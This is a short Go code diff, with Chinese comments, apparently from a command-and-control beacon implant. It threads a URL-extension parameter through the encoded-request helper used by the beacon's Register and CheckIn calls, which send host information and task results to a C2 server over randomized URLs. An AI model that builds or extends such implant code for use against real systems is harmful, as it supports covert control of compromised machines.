@@ -31,7 +31,7 @@ func contentType(encoderID int) string {
 // 4. 解码响应体
 //
 // 返回解码后的响应字节和可能出现的错误。
-func (c *Client) sendEncoded(jsonBody []byte, rctx *RequestContext) ([]byte, error) {
+func (c *Client) sendEncoded(jsonBody []byte, rctx *RequestContext, ext string) ([]byte, error) {
 	// 编码请求体
 	encodedBody, err := encodeBody(jsonBody, rctx.EncoderID)
 	if err != nil {
@@ -39,7 +39,7 @@ func (c *Client) sendEncoded(jsonBody []byte, rctx *RequestContext) ([]byte, err
 	}
 
 	// 生成随机 URL 并嵌入 nonce
-	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile)
+	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile, ext)
 	if err != nil {
 		return nil, fmt.Errorf("build random url: %w", err)
 	}
@@ -97,7 +97,7 @@ func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig)
 	}
 
 	rctx := NewRequestContext(c.c2Profile.EncoderModulus)
-	decodedBody, err := c.sendEncoded(jsonReq, rctx)
+	decodedBody, err := c.sendEncoded(jsonReq, rctx, protocol.ExtRegister)
 	if err != nil {
 		return "", err
 	}
@@ -136,7 +136,7 @@ func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*bea
 	}
 
 	rctx := NewRequestContext(c.c2Profile.EncoderModulus)
-	decodedBody, err := c.sendEncoded(jsonReq, rctx)
+	decodedBody, err := c.sendEncoded(jsonReq, rctx, protocol.ExtCheckin)
 	if err != nil {
 		return nil, err
 	}
